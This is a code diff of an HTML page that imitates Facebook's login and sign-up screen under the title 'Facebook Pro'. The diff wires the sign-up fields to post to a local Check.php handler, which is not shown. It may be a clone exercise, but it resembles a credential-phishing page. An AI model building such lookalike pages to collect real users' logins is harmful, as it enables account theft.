@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Facebook Pro-Log in or Sign up</title>
     <link rel="icon" href="pro.ico" type="image/x-icon">
-    <link rel="stylesheet" type="text/css" href="CSS/mai.css">
+    <link rel="stylesheet" type="text/css" href="CSS/main.css">
 </head>
 
 <body>
@@ -36,7 +36,7 @@
     <div class="right"><br/>
         <span style="font-size:230%;"><b>Create an account</b></span><br/>
             <br /><span style="font-size:130%;">It's free and always will be.</span><br/>
-            
+            <form action="./Assets/Check.php" method="post">   
         <span style="width:50%;"><input type="text" placeholder="First name"></span>&nbsp;
         <span style="width:50%;"><input type="text" placeholder="Surname"></span>
        <input type="email" placeholder="Mobile number or email address" name="userName"><br/>
@@ -129,7 +129,7 @@
         <p style="font-size:74%;">By clicking Sign Up, you agree to our <span style="color:blue;">Terms, Data Policy</span>and<br/>
          <span style="color:blue;">Cookie Policy.</span>
             You may receive SMS notifications from us and <br/>can opt out at any time.</p><br/>
-        <a href="./Assets/Check.php"><input type="button" value="Sign Up" /></a><br/><br/><br/>
+        <input type="submit" value="Sign Up" /><br/><br/><br/></form>
         <p id="footer">&copy; Ankit Prasad : 2019</p>
     </div>
 </body>
